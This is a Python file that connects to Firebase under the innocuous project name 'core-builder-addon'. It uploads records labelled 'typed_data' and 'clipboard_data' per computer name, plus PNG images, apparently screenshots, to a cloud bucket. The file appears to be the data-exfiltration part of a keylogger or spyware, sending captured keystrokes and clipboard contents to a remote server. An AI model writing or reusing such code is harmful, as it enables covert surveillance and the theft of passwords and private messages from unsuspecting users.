
from datetime import datetime
import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore
from firebase_admin import storage
from uuid import uuid4


cred = credentials.Certificate("core-builder-addon-e760e0910006.json")
firebase_admin.initialize_app(cred,{
    'storageBucket': 'core-builder-addon.appspot.com'
})
db = firestore.client()

def write_data(data, comname):
    db.collection(comname).document(str(datetime.now().strftime("%Y-%m-%d_%H:%M:%S"))).set({
        'typed_data' : data['typed_data'],
        'clipboard_data' : data['clipboard_data'],
        'date_time': datetime.now().strftime("%Y-%m-%d_%H:%M:%S"),
    }, merge= True)


def upload_images(imgpath):
    bucket = storage.bucket()
    blob = bucket.blob(imgpath)

    # Create new token
    new_token = uuid4()

    # Create new dictionary with the metadata
    metadata  = {"firebaseStorageDownloadTokens": new_token}

    # Set metadata to blob
    blob.metadata = metadata

    # Upload file
    blob.upload_from_filename(filename=imgpath, content_type='image/png')